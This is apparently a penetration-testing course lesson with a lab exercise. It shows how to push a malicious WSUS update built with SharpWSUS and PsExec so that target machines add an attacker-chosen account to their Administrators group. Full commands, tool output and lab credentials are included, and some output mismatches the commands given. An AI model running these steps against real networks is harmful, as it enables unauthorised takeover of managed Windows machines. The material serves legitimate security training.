
<h1>Windows Server Update Services (WSUS)</h1>
<p><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus">Windows Server Update Services (WSUS)</a> is a Microsoft service that allows administrators to distribute updates and patches for Microsoft products throughout an environment in a scalable way. This solution enables internal servers to receive updates without direct internet access. <code>WSUS</code> is widely used in Windows corporate networks.</p>
<h2>WSUS Rights</h2>
<p>Access to the WSUS service requires administrative privileges on the server where the <code>WSUS service</code> is installed, meaning we need a user who is a member of either the <code>Administrator Group</code> or the <code>WSUS Administrator Group</code>. To effectively use <code>WSUS service</code> for lateral movement, the WSUS Server must be configured on the target server to accept updates.</p>
<h2>WSUS Enumeration</h2>
<p>Before we leverage this service for lateral movement, we must identify if the WSUS Server is present. To get this information, we can query the registry key <code>HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate</code>. Let's connect to <code>SRV01</code> using Helen's credentials and execute the following query to identify if <code>WSUS</code> is configured on that server:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    WUServer    REG_SZ    http://wsus.inlanefreight.local:8530
</code></pre>
<p>The same can be achieved using <a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a>, which is a <code>CSharp</code> tool for lateral movement through <code>WSUS</code> (we will see more details later in this section). We can run <code>SharpWSUS.exe locate</code> to identify the WSUS server:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; .\SharpWSUS.exe locate
 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Locate WSUS Server
WSUS Server: http://wsus.inlanefreight.local:8530

[*] Locate complete
</code></pre>
<p>To conduct a deeper enumeration, we need to access the WSUS server. Let's connect via RDP to <code>WSUS</code> using Filiplain's credentials, username <code>filiplain</code> and password <code>Password1</code>. Once we get access to the WSUS server, we can execute <code>SharpWSUS.exe inspect</code>, and it will reveal information such as the computers managed by the WSUS server, the last update, check-in time for each computer, any Downstream Servers, and the <code>WSUS</code> groups.</p>
<pre><code class="language-powershell-session">c:\Tools&gt; .\SharpWSUS.exe inspect
 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Inspect WSUS Server

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
WSUS, 8530, C:\WSUS\WsusContent


####################### Computer Enumeration #######################
ComputerName, IPAddress, OSVersion, LastCheckInTime
---------------------------------------------------
sccm.inlanefreight.local, 172.20.0.25, 10.0.17763.2510, 6/26/2024 12:14:15 PM
dc01.inlanefreight.local, 172.20.0.10, 10.0.17763.2510,
srv01.inlanefreight.local, 172.20.0.51, 10.0.17763.2510,

####################### Downstream Server Enumeration #######################
ComputerName, OSVersion, LastCheckInTime
---------------------------------------------------

####################### Group Enumeration #######################
GroupName
---------------------------------------------------
All Computers
Downstream Servers
Unassigned Computers

[*] Inspect complete
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> Make sure to execute <code>PowerShell.exe</code> as Administrator.</p>
</div>
</div>
<h2>Lateral Movement From Windows</h2>
<p>Once we have access to an account with rights on the <code>WSUS server</code>, either a member of the <code>Administrators</code> or <code>WSUS Administrators</code>, our task is to create a patch that will give us command execution on the target machine. Let's use the capabilities of <code>SharpWSUS</code>, while explaining each step and technique used.</p>
<h3>Create a malicious patch</h3>
<p>WSUS is restricted to executing only Microsoft-signed binaries. To craft genuine-looking but malicious patch, we will utilize <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec">PSExec</a> from <a href="https://download.sysinternals.com/files/SysinternalsSuite.zip">Sysinternals</a>, a signed Microsoft binary that allows us to execute commands. We have the binary located at <code>C:\Tools\sysinternals\PSExec64.exe</code>.</p>
<p>To create a new windows update or malicious patch, we will use <code>SharpWSUS.exe create</code> as Administrator. We must specify the binary path to execute <code>/payload:&lt;Path to binary&gt;</code>, define the arguments for the payload with the option <code>/args</code> and optionally set the update title <code>/title:&lt;Update Title&gt;</code>.</p>
<p>To get command execution with <code>PSExec</code>, we will add our account <code>Filiplain</code> to the Administrators group. To do that, we will use the following PSExec arguments. First we set <code>-accepteula</code> to avoid pop-ups, <code>-s</code> to run as system, <code>-d</code> to return immediately and the command to execute <code>net localgroup Administrators filiplain /add</code>:</p>
<pre><code class="language-powershell-session">c:\Tools&gt; .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
[*] Creating patch to use the following:
[*] Payload: PSExec.exe
[*] Payload Path: C:\Tools\sysinternals\PSExec.exe
[*] Arguments: -accepteula -s -d cmd.exe /c 'net localgroup Administrators filiplain /add'
[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c &amp;amp;#39;net localgroup Administrators filiplain /add&amp;amp;#39;

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
WSUS, 8530, C:\WSUS\WsusContent

ImportUpdate
Update Revision ID: 101472
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 101473
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:Target.FQDN /groupname:"Group Name"

[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> Make sure to use <code>PSExec64.exe</code> if targeting a 64bit computer.</p>
</div>
</div>
<p>The output above gave us three commands that we can execute to complete the Windows update process, which are approve, check and delete. We will use those commands later in this section.</p>
<p>To see the results of our command in the WSUS Service, we can open <code>Windows Server Update Service</code> application to identify if our update got added into the server.</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/wsus_approve.png"/></p>
<p>Let's move into <code>Security Updates</code> and make sure that Approval is set to <code>Unapproved</code> and Status is <code>Any</code>, and we will see the update we created with <code>SharpWSUS</code> named <code>NewAccountUpdate</code>:</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/wsus_securityupdate.png"/></p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> Local or remote access to the WSUS Server is required to perform this attack.</p>
</div>
</div>
<h3>Approve the malicious patch for deployment with SharpWSUS</h3>
<p>To approve the malicious patch, we need to specify the computers which this patch will apply to and associate those computers with a group. We can achieve all this with <code>SharpWSUS</code> by using the command the previous output gave us. That output has the update ID that corresponds to the update we created, it is important to make sure that we are using the right update ID. We need to use <code>SharpWSUS.exe approve</code> with the option <code>/updateid:&lt;update ID&gt;</code>, set the target computer with the option <code>/computername:&lt;Target Computer&gt;</code>, we are going to target <code>SRV01</code> and finally set the new group to be created with the option <code>/groupname:&lt;Group Name&gt;</code>:</p>
<pre><code class="language-powershell-session">c:\Tools&gt; .\SharpWSUS.exe approve /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv01.inlanefreight.local /groupname:"FastUpdates"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Approve Update

Targeting srv02.inlanefreight.local
TargetComputer, ComputerID, TargetID
------------------------------------
srv02.inlanefreight.local, d4e385a2-01e1-444f-b856-f857b8989b43, 1
Group Exists = False
Group Created: Hacker Group
Added Computer To Group
Approved Update

[*] Approve complete
</code></pre>
<p>The tool will inform us if the group is already present before attempting to create it; if no other group exists with that name, the update will be approved and the group created. We can inspect again to confirm the <code>WSUS</code> groups:</p>
<pre><code class="language-powershell-session">c:\Tools&gt; .\SharpWSUS.exe inspect

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Inspect WSUS Server

... SNIP ...

####################### Group Enumeration #######################
GroupName
---------------------------------------------------
All Computers
Downstream Servers
FastUpdates
Unassigned Computers

[*] Inspect complete
</code></pre>
<h3>Approve the malicious patch for deployment manually</h3>
<p>During our testing, sometimes, <code>SharpWSUS</code> won't work to automatically approve the update. We also encounter some errors when uploading <code>PSExec64.exe</code> once the update is approved. Let's see how we can do this process manually in case we have an error.</p>
<p>Within the <code>WSUS Service</code>, let's navigate into <code>All Updates</code> and make sure that Approval is set to <code>Unapproved</code> and Status is <code>Any</code>, and we will see the update we created with <code>SharpWSUS</code> named <code>NewAccountUpdate</code>:</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/wsus_approve.png"/></p>
<p>Now, we need to right-click the update and click <code>approval</code> or we can go to the actions panel on the right and click <code>Approve...</code>:</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/wsus_manual_approval.png"/></p>
<p>We need to select the group we want to apply this update to complete the approval. We will choose <code>All Computer</code> by right-clicking it, selecting <code>Approved for Install</code>, and clicking OK:</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/wsus_approve_computers.png"/></p>
<p>Next, we change the Approval status to <code>Approved</code>, make sure the Status is set to <code>Any</code>, and confirm that everything is working.</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/wsus_downloaded.png"/></p>
<p>There may be situations, commonly, when we attempt to perform this attack using only a WSUS Administrator account that is not a member of the WSUS Administrators group. When we approve the update, it will fail to download our PSExec64.exe file. As we can see in the following image:</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/wsus_update_file_error.png"/></p>
<p>To fix this error, we can copy the <code>PSExec64.exe</code> to the WSUScontent directory and rename the file as expected by the WSUS Service. To confirm what's the WSUScontent directory and the filename, we can use the <code>Event Viewer</code>. The WSUS Service will generate an event id 364 if the <code>Content file download failed</code>, let's use PowerShell <code>Get-WinEvent</code> to retrieve this event:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; Get-WinEvent -LogName Application | Where-Object { $_.Id -eq 364 } |fl

TimeCreated  : 7/3/2024 5:19:00 AM
ProviderName : Windows Server Update Services
Id           : 364
Message      : Content file download failed.
 Reason: HTTP status 404: The requested URL does not exist on the server.

 Source File: /Content/wuagent.exe
 Destination File: C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe
</code></pre>
<p>We get the <code>Destination File</code>, now we need to copy PSExec64.exe to that location:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; copy C:\Tools\sysinternals\PSExec64.exe C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe
</code></pre>
<p>Now, we go to the WSUS Service GUI, select the update with the error, and click <code>Retry Download</code>. Once the server confirms the file exists, it will allow the download of our payload.</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/wsus_downloaded.png"/></p>
<p>Ideally, if we copied <code>PsExec64.exe</code> into the <code>WsusContent</code> directory, it is recommended that we create another update with a different title but the same payload. This will help force the update quickly.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> If updates approved by SharpWSUS.exe are not being installed, try creating a new update and approving it manually. </p>
</div>
</div>
<h3>Wait for the client to download the patch</h3>
<p>The last thing we need to do is to wait for the target computer to install the new updates. We can verify if the installation was finalized by running <code>SharpWSUS.exe check</code>, specify the update id <code>/updateid:&lt;Update ID&gt;</code> and the target computer name <code>/computername:&lt;Target Computer&gt;</code>:</p>
<pre><code class="language-powershell-session">c:\Tools&gt; .\SharpWSUS.exe check /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv01.inlanefreight.local
 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Check Update

Targeting srv01.inlanefreight.local
TargetComputer, ComputerID, TargetID
------------------------------------
srv01.inlanefreight.local, bbc6e1ed-75ec-4eea-81cf-05da5c18e93e, 3

Update Info cannot be found.

[*] Check complete
</code></pre>
<p>The above output indicates that the computer hasn't completed the update process. We can force this process if we have access to the target computer by clicking <code>Check For Updates</code>:</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/windowsupdate.gif"/></p>
<p>We successfully installed our update. If we use <code>SharpWSUS.exe check</code> again, it will show that we successfully installed the update.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> It may take some time for the WSUS service to register that the update was applied. </p>
</div>
</div>
<p>We have successfully added a new member to the Administrator group of the target computer, we can now execute commands as an administrator using Filiplain's credentials.</p>
<pre><code class="language-powershell-session">c:\Tools&gt; net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
INLANEFREIGHT\Domain Admins
INLANEFREIGHT\Filiplain
INLANEFREIGHT\PDQ Deploy Admin
The command completed successfully
</code></pre>
<h3>Clean up after the patch is downloaded</h3>
<p>To clean up everything about the malicious update running <code>SharpWSUS.exe delete</code>, specify the update id <code>/updateid:&lt;Update ID&gt;</code> and the target computer <code>/computername:&lt;Target Computer</code>.</p>
<pre><code class="language-powershell-session">c:\Tools&gt; .\SharpWSUS.exe delete /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv02.inlanefreight.local

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Delete Update

[*] Update declined.


[*] Update deleted.


Targeting srv02.inlanefreight.local
TargetComputer, ComputerID, TargetID
------------------------------------
srv02.inlanefreight.local, d4e385a2-01e1-444f-b856-f857b8989b43, 1
Removed Computer From Group
Remove Group

[*] Delete complete
</code></pre>
<h2>Alternative Tools for Abusing WSUS</h2>
<p>While <code>SharpWSUS</code> is a powerful tool for exploiting WSUS servers, other tools are available for similar purposes. <a href="https://github.com/alex-dengx/WSUSpendu">WSUSpendu</a>, a PowerShell tool, allows for the injection of malicious updates, forcing systems relying on the compromised WSUS server to execute arbitrary commands. Another option is <a href="https://github.com/ThunderGunExpress/Thunder_Woosus">Thunder_Woosus</a>, a C# tool designed for manipulating WSUS updates and enabling arbitrary command execution on targeted machines.</p>
<p>However, at the time of writing, there are no equivalent tools that function exclusively from a Linux environment, highlighting a gap in the current tooling landscape and a potential opportunity for future development.</p>
<h2>Conclusion</h2>
<p>Using WSUS for lateral movement involves deploying malicious Windows updates that force any computer trusting the WSUS Server to execute arbitrary commands. WSUS services are compelling targets in Windows environments because, even within restricted or highly secured networks, they can be exploited to compromise any machine.</p>
<p>In the upcoming section, we will examine other general considerations to bear in mind when performing lateral movement in Windows environments.</p>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-success '&gt;low Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="29" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="36" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="38" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="47" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg"/>
</div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                Authenticate
                                to <span class="target-protocol-ip target-protocol-ip-2460 text-dark"></span> with user "<span class="text-success">filiplain</span>" and
                                password "<span class="text-danger">Password1</span>" </p>
<label class="module-question" for="2460"><span class="badge badge-soft-dark font-size-14 mr-2">+ 5 <i class="fad fa-cube text-success"></i></span> Compromise the DC01 using WSUS. Submit the flag located at C:\WSUS\flag.txt
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2460" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2460">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2460" id="btnAnswer2460">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Optional Exercises</h4>
<p class="card-title-desc font-size-large font-size-15">
                                Challenge your understanding of the Module content and answer the optional
                                question(s) below. These are considered supplementary content and are not
                                required to complete the Module. You can reveal the answer at any time to check
                                your work.
                            </p>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
